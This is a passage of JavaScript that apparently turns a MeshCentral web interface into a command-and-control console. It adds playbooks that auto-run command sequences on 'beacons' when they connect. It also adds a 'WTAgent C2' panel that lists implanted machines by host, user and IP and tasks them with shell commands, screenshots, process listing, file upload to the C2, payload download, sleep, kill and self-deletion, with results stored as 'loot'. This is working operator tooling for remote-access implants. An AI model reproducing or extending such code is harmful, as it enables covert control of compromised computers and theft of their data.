        injectPlaybooksButton();

        // Auto-fire hook: when a beacon connects, run all autoFire playbooks
        wtLogEventHooks.push(function(type, msg, nodeId) {
            if (type !== 'connect' || !nodeId) return;
            var runs = wtPlaybooks.filter(function(p) { return p.autoFire && p.steps && p.steps.length; });
            if (!runs.length) return;
            setTimeout(function() {
                runs.forEach(function(p) { wtFirePlaybook(p, nodeId, true); });
            }, 3500);
        });
    }

    function updatePlaybooksBadge() {
        var badge = document.getElementById('wtPlayBadge');
        var n = wtPlaybooks.filter(function(p) { return p.autoFire; }).length;
        if (badge) { badge.textContent = n; badge.style.display = n > 0 ? 'inline-block' : 'none'; }
    }

    function injectPlaybooksButton() {
        var toolbar = getWtToolbar();
        if (!toolbar || document.getElementById('wtPlayBtn')) return;
        var btn = document.createElement('span');
        btn.id = 'wtPlayBtn';
        btn.className = 'wt-toolbar-btn';
        btn.title = 'Automated Playbooks';
        btn.onclick = togglePlaybooksPanel;

        var badge = document.createElement('span');
        badge.id = 'wtPlayBadge';
        badge.className = 'wt-play-badge';
        badge.style.display = 'none';

        btn.innerHTML = '&#9654; PLAY';
        btn.appendChild(badge);
        toolbar.appendChild(btn);
        updatePlaybooksBadge();
    }

    function togglePlaybooksPanel() {
        var panel = document.getElementById('wtPlayPanel');
        if (!panel) { buildPlaybooksPanel(); panel = document.getElementById('wtPlayPanel'); }
        wtPlaybooksVisible = !wtPlaybooksVisible;
        if (panel) panel.style.display = wtPlaybooksVisible ? 'block' : 'none';
        var btn = document.getElementById('wtPlayBtn');
        if (btn) {
            // preserve badge child
            var badge = document.getElementById('wtPlayBadge');
            btn.childNodes[0].textContent = '\u25b6 PLAY';
            btn.style.color = wtPlaybooksVisible ? 'var(--cs-accent-cyan)' : '';
        }
        if (wtPlaybooksVisible) renderPlaybookList();
    }

    function buildPlaybooksPanel() {
        if (document.getElementById('wtPlayPanel')) return;
        var toolbar = getWtToolbar();
        if (!toolbar) return;
        var insertAfter = toolbar.parentElement;

        var panel = document.createElement('div');
        panel.id = 'wtPlayPanel';
        panel.className = 'wt-play-panel';
        panel.style.display = 'none';
        panel.innerHTML =
            '<div class="wt-play-header">' +
                '<span class="wt-play-title">&#9654; AUTOMATED PLAYBOOKS</span>' +
                '<span class="wt-play-hint">Toggle AUTO-FIRE to run steps automatically on beacon CONNECT</span>' +
                '<div class="wt-play-header-btns">' +
                    '<button id="wtPlayAddBtn" class="wt-play-hdr-btn" style="color:#00ff41!important;border-color:rgba(0,255,65,.35)!important">+ NEW</button>' +
                    '<button id="wtPlayCloseBtn" class="wt-play-hdr-btn">&#10005;</button>' +
                '</div>' +
            '</div>' +
            '<div class="wt-play-body">' +
                '<div id="wtPlayList"></div>' +
                '<div id="wtPlayEditor" style="display:none"></div>' +
            '</div>';

        insertAfter.parentElement.insertBefore(panel, insertAfter.nextSibling);
        document.getElementById('wtPlayCloseBtn').onclick = togglePlaybooksPanel;
        document.getElementById('wtPlayAddBtn').onclick   = function() { showPlaybookEditor(null); };
    }

    function renderPlaybookList() {
        var list = document.getElementById('wtPlayList');
        if (!list) return;
        if (!wtPlaybooks.length) {
            list.innerHTML = '<div class="wt-play-empty">No playbooks. Click + NEW to create one.</div>';
            return;
        }
        var html = '<table class="wt-play-table"><thead><tr>' +
            '<th>NAME</th><th>STEPS</th><th>AUTO-FIRE ON CONNECT</th><th>ACTIONS</th>' +
            '</tr></thead><tbody>';
        wtPlaybooks.forEach(function(p, idx) {
            html += '<tr class="wt-play-row' + (p.builtIn ? ' wt-play-builtin' : '') + '">' +
                '<td class="wt-play-name">' + wtEsc(p.name) +
                    (p.builtIn ? '<span class="wt-play-builtin-tag">BUILT-IN</span>' : '') +
                '</td>' +
                '<td class="wt-play-steps-count">' + (p.steps ? p.steps.length : 0) + '</td>' +
                '<td><button class="wt-play-auto-btn ' + (p.autoFire ? 'wt-play-auto-on' : 'wt-play-auto-off') +
                    '" onclick="window._wtPlayToggleAuto(' + idx + ')">' + (p.autoFire ? '&#9679; ON' : 'OFF') + '</button></td>' +
                '<td class="wt-play-actions">' +
                    '<button class="wt-play-act-btn wt-play-fire-btn" onclick="window._wtPlayFire(' + idx + ')">&#9654; FIRE</button>' +
                    '<button class="wt-play-act-btn wt-play-edit-btn" onclick="window._wtPlayEdit(' + idx + ')">EDIT</button>' +
                    (!p.builtIn ? '<button class="wt-play-act-btn wt-play-del-btn" onclick="window._wtPlayDelete(' + idx + ')">&#10005;</button>' : '') +
                '</td>' +
            '</tr>';
        });
        html += '</tbody></table>';
        list.innerHTML = html;

        window._wtPlayToggleAuto = function(idx) {
            wtPlaybooks[idx].autoFire = !wtPlaybooks[idx].autoFire;
            savePlaybookStore(); updatePlaybooksBadge(); renderPlaybookList();
        };
        window._wtPlayFire   = function(idx) { wtFirePlaybook(wtPlaybooks[idx], null, false); };
        window._wtPlayEdit   = function(idx) { showPlaybookEditor(idx); };
        window._wtPlayDelete = function(idx) {
            if (wtPlaybooks[idx].builtIn) return;
            if (!confirm('Delete playbook "' + wtPlaybooks[idx].name + '"?')) return;
            wtPlaybooks.splice(idx, 1);
            savePlaybookStore(); renderPlaybookList();
        };
    }

    function showPlaybookEditor(idx) {
        var editor = document.getElementById('wtPlayEditor');
        var list   = document.getElementById('wtPlayList');
        if (!editor) return;
        var isNew = (idx === null);
        var p = isNew
            ? { id: 'custom_' + Date.now(), name: 'NEW PLAYBOOK', builtIn: false, autoFire: false, steps: [] }
            : JSON.parse(JSON.stringify(wtPlaybooks[idx]));

        if (list) list.style.display = 'none';
        editor.style.display = 'block';

        function sp(e) { e.stopPropagation(); }

        function renderEditor() {
            var stepsHtml = (p.steps || []).map(function(s, si) {
                return '<div class="wt-play-step-row">' +
                    '<span class="wt-play-step-num">' + (si + 1) + '</span>' +
                    '<input class="wt-play-step-label" placeholder="Label" value="' + wtEsc(s.label || '') +
                        '" onchange="window._wtES_label(' + si + ',this.value)" onkeydown="event.stopPropagation()" onkeyup="event.stopPropagation()" onkeypress="event.stopPropagation()">' +
                    '<input class="wt-play-step-cmd" placeholder="Command" value="' + wtEsc(s.cmd || '') +
                        '" onchange="window._wtES_cmd(' + si + ',this.value)" onkeydown="event.stopPropagation()" onkeyup="event.stopPropagation()" onkeypress="event.stopPropagation()">' +
                    '<input class="wt-play-step-delay" type="number" min="0" step="500" placeholder="Delay ms" value="' + (s.delay || 0) +
                        '" onchange="window._wtES_delay(' + si + ',this.value)" onkeydown="event.stopPropagation()" onkeyup="event.stopPropagation()" onkeypress="event.stopPropagation()">' +
                    '<button class="wt-play-step-del" onclick="window._wtES_del(' + si + ')">&#10005;</button>' +
                '</div>';
            }).join('');

            editor.innerHTML =
                '<div class="wt-play-editor-hdr">' +
                    '<button class="wt-play-hdr-btn" onclick="window._wtES_back()">&larr; BACK</button>' +
                    '<input id="wtPlayNameInp" class="wt-play-name-input" value="' + wtEsc(p.name) + '" placeholder="Playbook Name"' +
                        (p.builtIn ? ' readonly' : '') +
                        ' onkeydown="event.stopPropagation()" onkeyup="event.stopPropagation()" onkeypress="event.stopPropagation()">' +
                    '<button class="wt-play-hdr-btn wt-play-save-btn" onclick="window._wtES_save()">SAVE</button>' +
                '</div>' +
                '<div class="wt-play-steps-wrap">' +
                    '<div class="wt-play-steps-header">' +
                        '<span>STEPS &nbsp;<span style="color:var(--cs-text-dim);font-size:9px">(delay = ms to wait before running this step)</span></span>' +
                        (!p.builtIn ? '<button class="wt-play-act-btn wt-play-fire-btn" style="margin-left:10px" onclick="window._wtES_add()">+ STEP</button>' : '') +
                    '</div>' +
                    '<div id="wtPlayStepsList">' + (stepsHtml || '<div class="wt-play-empty">No steps. Click + STEP to add.</div>') + '</div>' +
                '</div>';

            window._wtES_label = function(si, v) { p.steps[si].label = v; };
            window._wtES_cmd   = function(si, v) { p.steps[si].cmd   = v; };
            window._wtES_delay = function(si, v) { p.steps[si].delay = parseInt(v) || 0; };
            window._wtES_del   = function(si) { p.steps.splice(si, 1); renderEditor(); };
            window._wtES_add   = function() { p.steps.push({ label: 'Step ' + (p.steps.length + 1), cmd: '', delay: 1500 }); renderEditor(); };
            window._wtES_back  = function() { editor.style.display = 'none'; if (list) list.style.display = ''; renderPlaybookList(); };
            window._wtES_save  = function() {
                var nameEl = document.getElementById('wtPlayNameInp');
                if (nameEl && !p.builtIn) p.name = nameEl.value.trim() || p.name;
                if (isNew) { wtPlaybooks.push(p); } else { wtPlaybooks[idx] = p; }
                savePlaybookStore(); updatePlaybooksBadge();
                editor.style.display = 'none'; if (list) list.style.display = '';
                renderPlaybookList();
            };
        }
        renderEditor();
    }

    function wtFirePlaybook(playbook, nodeId, isAuto) {
        if (!playbook || !playbook.steps || !playbook.steps.length) return;
        var targetNodeId = nodeId || wtCurrentIntelNodeId || null;
        var label = playbook.name;

        wtLogEvent('CMD',
            (isAuto ? '[AUTO-PLAY] ' : '[PLAY] ') + label +
            ' \u2013 ' + playbook.steps.length + ' step' + (playbook.steps.length !== 1 ? 's' : '') +
            (targetNodeId ? '' : ' \u2192 broadcast'),
            targetNodeId);

        // Flash play button
        var btn = document.getElementById('wtPlayBtn');
        if (btn && !btn._wtFlash) {
            btn._wtFlash = true;
            btn.style.color = 'var(--cs-accent-green)';
            setTimeout(function() { btn.style.color = wtPlaybooksVisible ? 'var(--cs-accent-cyan)' : ''; btn._wtFlash = false; }, 1300);
        }

        if (targetNodeId) {
            // Single beacon via sendBeaconCmd with cumulative delay
            var cum = 0;
            playbook.steps.forEach(function(step) {
                cum += (step.delay || 0);
                (function(cmd, lbl, d) {
                    setTimeout(function() {
                        sendBeaconCmd(cmd);
                        wtLogEvent('CMD', '[PLAY:' + label + '] ' + wtTrunc(lbl || cmd, 55), targetNodeId);
                    }, d);
                })(step.cmd, step.label, cum);
            });
        } else {
            // No active beacon: broadcast to all checked beacons via runcommands
            var nodeids = [];
            if (typeof checkedNodeids !== 'undefined') nodeids = Object.keys(checkedNodeids);
            if (!nodeids.length) {
                wtLogEvent('INFO', '[PLAY] No beacon — open terminal or select beacons first', null);
                return;
            }
            var cum2 = 0;
            playbook.steps.forEach(function(step) {
                cum2 += (step.delay || 0);
                (function(cmd, d) {
                    setTimeout(function() {
                        try {
                            meshserver.send({
                                action: 'runcommands', nodeids: nodeids,
                                type: 1, cmds: cmd, runAsUser: 0,
                                responseid: 'wt_play_' + Date.now()
                            });
                        } catch(e) {}
                    }, d);
                })(step.cmd, cum2);
            });
        }
    }
    // ============================================================

    // ============================================================
    // Section 27: WTAgent C2 Panel
    // Operator interface for wt_c2_server.js agents (separate from
    // MeshCentral agents). Polls /op/agents via Bearer token auth.
    // Config stored in localStorage: wt_agent_url, wt_agent_token
    // ============================================================
    var wtAgentPanelVisible = false;
    var wtAgentPollTimer    = null;
    var wtAgentSelected     = null;    // currently selected agent ID
    var wtAgentResultTimer  = null;

    function wtAgentApiBase() {
        return (localStorage.getItem('wt_agent_url') || '').replace(/\/$/, '');
    }
    function wtAgentToken() {
        return localStorage.getItem('wt_agent_token') || '';
    }

    function wtAgentFetch(path, opts) {
        var base  = wtAgentApiBase();
        var token = wtAgentToken();
        if (!base || !token) return Promise.reject(new Error('WTAgent: no URL/token configured'));
        var headers = Object.assign({ 'Authorization': 'Bearer ' + token }, (opts && opts.headers) || {});
        return fetch(base + path, Object.assign({}, opts, { headers: headers }));
    }

    function injectWTAgentButton() {
        var toolbar = document.getElementById('devListToolbarSpan');
        if (!toolbar) { setTimeout(injectWTAgentButton, 800); return; }
        if (document.getElementById('wtAgentBtn')) return;
        var btn = document.createElement('span');
        btn.id        = 'wtAgentBtn';
        btn.className = 'wt-toolbar-btn';
        btn.title     = 'WTAgent C2 — standalone beacon control';
        btn.innerHTML = '&#9889; WTAGENT';
        btn.onclick   = toggleWTAgentPanel;
        toolbar.appendChild(btn);
    }

    function toggleWTAgentPanel() {
        var panel = document.getElementById('wtAgentPanel');
        if (!panel) { buildWTAgentPanel(); return; }
        wtAgentPanelVisible = !wtAgentPanelVisible;
        panel.style.display = wtAgentPanelVisible ? 'block' : 'none';
        var btn = document.getElementById('wtAgentBtn');
        if (btn) btn.classList.toggle('wt-toolbar-btn-active', wtAgentPanelVisible);
        if (wtAgentPanelVisible) {
            startWTAgentPoll();
        } else {
            stopWTAgentPoll();
        }
    }

    function buildWTAgentPanel() {
        var anchor = document.getElementById('devListToolbarSpan');
        if (!anchor || !anchor.parentNode) return;

        var panel = document.createElement('div');
        panel.id        = 'wtAgentPanel';
        panel.className = 'wt-agent-panel';
        panel.innerHTML = [
            '<div class="wt-agent-header">',
            '  <span class="wt-agent-title">&#9889; WTAGENT C2</span>',
            '  <span class="wt-agent-controls">',
            '    <span class="wt-agent-status" id="wtAgentStatus">OFFLINE</span>',
            '    <button class="wt-agent-cfg-btn" onclick="wtAgentShowConfig()" title="Configure API URL and token">&#9881; CFG</button>',
            '    <button class="wt-agent-cfg-btn" onclick="wtAgentRefresh()">&#8635; REFRESH</button>',
            '  </span>',
            '</div>',
            '<div id="wtAgentConfigBox" class="wt-agent-config-box" style="display:none">',
            '  <label>C2 API URL (e.g. https://192.168.1.50:8443)</label>',
            '  <input id="wtAgentUrlInput" class="wt-agent-input" type="text" placeholder="https://host:8443" />',
            '  <label>Operator Token</label>',
            '  <input id="wtAgentTokInput" class="wt-agent-input" type="password" placeholder="paste token from wt_op_token.txt" />',
            '  <button class="wt-agent-save-btn" onclick="wtAgentSaveConfig()">SAVE</button>',
            '</div>',
            '<div id="wtAgentBody">',
            '  <div class="wt-agent-table-wrap">',
            '    <table class="wt-agent-table" id="wtAgentTable">',
            '      <thead><tr>',
            '        <th>ID</th><th>HOST</th><th>USER</th><th>IP</th><th>OS</th>',
            '        <th>LAST SEEN</th><th>PENDING</th><th>ACTIONS</th>',
            '      </tr></thead>',
            '      <tbody id="wtAgentTbody"><tr><td colspan="8" class="wt-agent-empty">No agents connected</td></tr></tbody>',
            '    </table>',
            '  </div>',
            '  <div id="wtAgentTaskArea" class="wt-agent-task-area" style="display:none">',
            '    <div class="wt-agent-task-header">',
            '      <span id="wtAgentTaskLabel">TASK → <span id="wtAgentTaskTarget"></span></span>',
            '      <button class="wt-agent-cfg-btn" onclick="wtAgentCloseTask()">&#10005;</button>',
            '    </div>',
            '    <div class="wt-agent-task-row">',
            '      <select id="wtAgentTaskType" class="wt-agent-select" onchange="wtAgentTaskTypeChange()">',
            '        <option value="shell">shell</option>',
            '        <option value="screenshot">screenshot</option>',
            '        <option value="proclist">proclist</option>',
            '        <option value="upload">upload (agent→C2)</option>',
            '        <option value="download">download (C2→agent)</option>',
            '        <option value="sleep">sleep</option>',
            '        <option value="kill">kill</option>',
            '        <option value="selfdel">selfdel</option>',
            '      </select>',
            '      <input id="wtAgentTaskArg" class="wt-agent-input wt-agent-task-arg" type="text" placeholder="command / filename / sleep-ms" />',
            '      <button class="wt-agent-send-btn" onclick="wtAgentSendTask()">&#9654; SEND</button>',
            '    </div>',
            '    <div class="wt-agent-results-header">',
            '      <span>RESULTS</span>',
            '      <button class="wt-agent-cfg-btn" onclick="wtAgentLoadResults()">&#8635;</button>',
            '    </div>',
            '    <div id="wtAgentResults" class="wt-agent-results"></div>',
            '  </div>',
            '</div>'
        ].join('\n');

        anchor.parentNode.insertBefore(panel, anchor.nextSibling);

        // Pre-fill config inputs if already saved
        document.getElementById('wtAgentUrlInput').value = wtAgentApiBase();
        document.getElementById('wtAgentTokInput').value = wtAgentToken();

        wtAgentPanelVisible = true;
        var btn = document.getElementById('wtAgentBtn');
        if (btn) btn.classList.add('wt-toolbar-btn-active');

        // Auto-show config if not configured yet
        if (!wtAgentApiBase() || !wtAgentToken()) wtAgentShowConfig();

        startWTAgentPoll();
    }

    function wtAgentShowConfig() {
        var box = document.getElementById('wtAgentConfigBox');
        if (!box) return;
        box.style.display = box.style.display === 'none' ? 'block' : 'none';
    }

    function wtAgentSaveConfig() {
        var u = (document.getElementById('wtAgentUrlInput').value || '').trim().replace(/\/$/, '');
        var t = (document.getElementById('wtAgentTokInput').value || '').trim();
        if (!u || !t) return;
        localStorage.setItem('wt_agent_url', u);
        localStorage.setItem('wt_agent_token', t);
        var box = document.getElementById('wtAgentConfigBox');
        if (box) box.style.display = 'none';
        wtAgentRefresh();
    }

    function wtAgentRefresh() {
        wtAgentFetch('/op/agents')
            .then(function(r) {
                if (!r.ok) throw new Error('HTTP ' + r.status);
                return r.json();
            })
            .then(function(agents) {
                wtAgentSetStatus('ONLINE', true);
                renderWTAgentTable(agents);
                if (wtAgentSelected) wtAgentLoadResults();
            })
            .catch(function(e) {
                wtAgentSetStatus('OFFLINE', false);
            });
    }

    function wtAgentSetStatus(label, online) {
        var el = document.getElementById('wtAgentStatus');
        if (!el) return;
        el.textContent = label;
        el.className = 'wt-agent-status ' + (online ? 'wt-agent-status-on' : 'wt-agent-status-off');
    }

    function renderWTAgentTable(agents) {
        var tbody = document.getElementById('wtAgentTbody');
        if (!tbody) return;
        if (!agents || !agents.length) {
            tbody.innerHTML = '<tr><td colspan="8" class="wt-agent-empty">No agents connected</td></tr>';
            return;
        }
        var now = Date.now();
        tbody.innerHTML = agents.map(function(a) {
            var age    = Math.floor((now - a.lastSeen) / 1000);
            var ageStr = age < 60 ? age + 's' : age < 3600 ? Math.floor(age/60) + 'm' : Math.floor(age/3600) + 'h';
            var active = age < 30;
            return [
                '<tr class="wt-agent-row' + (a.id === wtAgentSelected ? ' wt-agent-row-sel' : '') + '">',
                '  <td><span class="wt-beacon-id-badge">' + a.id.substring(0,8) + '</span></td>',
                '  <td>' + esc(a.host) + '</td>',
                '  <td>' + esc(a.user) + '</td>',
                '  <td>' + esc(a.ip)   + '</td>',
                '  <td>' + esc(a.os ? a.os.replace(/Windows /i,'Win').replace(/ \(.+\)/,'') : '?') + '</td>',
                '  <td><span class="' + (active ? 'wt-beacon-active' : 'wt-beacon-idle') + '">' + ageStr + '</span></td>',
                '  <td>' + (a.pendingTasks || 0) + '</td>',
                '  <td><button class="wt-agent-task-btn" onclick="wtAgentOpenTask(\'' + a.id + '\')">TASK</button>',
                '      <button class="wt-agent-kill-btn" onclick="wtAgentQuickKill(\'' + a.id + '\')">KILL</button></td>',
                '</tr>'
            ].join('');
        }).join('');
    }

    function wtAgentOpenTask(agentId) {
        wtAgentSelected = agentId;
        var area = document.getElementById('wtAgentTaskArea');
        if (!area) return;
        area.style.display = 'block';
        var lbl = document.getElementById('wtAgentTaskTarget');
        if (lbl) lbl.textContent = agentId.substring(0,8);
        document.getElementById('wtAgentTaskArg').value = '';
        document.getElementById('wtAgentTaskType').value = 'shell';
        wtAgentTaskTypeChange();
        wtAgentLoadResults();
        // Highlight row
        document.querySelectorAll('.wt-agent-row').forEach(function(r) { r.classList.remove('wt-agent-row-sel'); });
        var rows = document.querySelectorAll('.wt-agent-row');
        rows.forEach(function(r) {
            if (r.querySelector('.wt-beacon-id-badge') &&
                r.querySelector('.wt-beacon-id-badge').textContent === agentId.substring(0,8))
                r.classList.add('wt-agent-row-sel');
        });
    }

    function wtAgentCloseTask() {
        wtAgentSelected = null;
        var area = document.getElementById('wtAgentTaskArea');
        if (area) area.style.display = 'none';
    }

    function wtAgentTaskTypeChange() {
        var type  = document.getElementById('wtAgentTaskType').value;
        var input = document.getElementById('wtAgentTaskArg');
        if (!input) return;
        var noArg = ['screenshot','proclist','kill','selfdel'];
        input.style.display   = noArg.indexOf(type) >= 0 ? 'none' : 'inline-block';
        input.placeholder = type === 'shell'    ? 'e.g. whoami /all' :
                            type === 'upload'   ? 'C:\\path\\to\\file.txt' :
                            type === 'download' ? 'filename.exe (must be staged)' :
                            type === 'sleep'    ? 'interval in ms, e.g. 10000' : '';
    }

    function wtAgentSendTask() {
        if (!wtAgentSelected) return;
        var type = document.getElementById('wtAgentTaskType').value;
        var arg  = (document.getElementById('wtAgentTaskArg').value || '').trim();
        var body = { type: type };
        if (arg) body.arg = arg;
        if (type === 'sleep' && arg) body.sleep = parseInt(arg, 10);
        wtAgentFetch('/op/task/' + wtAgentSelected, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        })
        .then(function(r) { return r.json(); })
        .then(function(r) {
            if (r.ok) {
                wtLogEvent('CMD', '[WTAGENT:' + wtAgentSelected.substring(0,8) + '] ' + type + (arg ? ' ' + arg : ''), null);
                document.getElementById('wtAgentTaskArg').value = '';
                setTimeout(wtAgentLoadResults, 500);
            }
        })
        .catch(function() {});
    }

    function wtAgentQuickKill(agentId) {
        if (!confirm('Kill agent ' + agentId.substring(0,8) + '?')) return;
        wtAgentFetch('/op/task/' + agentId, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'kill' })
        }).catch(function() {});
    }

    function wtAgentLoadResults() {
        if (!wtAgentSelected) return;
        wtAgentFetch('/op/results/' + wtAgentSelected)
            .then(function(r) { return r.json(); })
            .then(function(res) { renderWTAgentResults(res); })
            .catch(function() {});
    }

    function renderWTAgentResults(results) {
        var el = document.getElementById('wtAgentResults');
        if (!el) return;
        if (!results || !results.length) {
            el.innerHTML = '<div class="wt-agent-no-results">No results yet</div>';
            return;
        }
        el.innerHTML = results.slice(0, 30).map(function(r) {
            var ts  = new Date(r.ts).toLocaleTimeString();
            var out = (r.out || '').substring(0, 2000);
            var isScreenshot = r.type === 'screenshot' || (out.indexOf('[saved to loot/') === 0);
            return [
                '<div class="wt-agent-result">',
                '  <div class="wt-agent-result-hdr">',
                '    <span class="wt-agent-result-id">[' + esc(r.task_id) + ']</span>',
                '    <span class="wt-agent-result-type">' + esc(r.type) + '</span>',
                '    <span class="wt-agent-result-ts">' + ts + '</span>',
                '  </div>',
                isScreenshot
                    ? '<div class="wt-agent-result-out wt-agent-result-dim">' + esc(out) + '</div>'
                    : '<pre class="wt-agent-result-out">' + esc(out || '(no output)') + '</pre>',
                '</div>'
            ].join('');
        }).join('');
    }

    function startWTAgentPoll() {
        stopWTAgentPoll();
        wtAgentRefresh();
        wtAgentPollTimer = setInterval(function() {
            if (wtAgentPanelVisible) wtAgentRefresh();
        }, 5000);
    }

    function stopWTAgentPoll() {
        if (wtAgentPollTimer) { clearInterval(wtAgentPollTimer); wtAgentPollTimer = null; }
    }

    function esc(s) {
        return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    function setupWTAgentPanel() {
        injectWTAgentButton();
    }
    // ============================================================

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
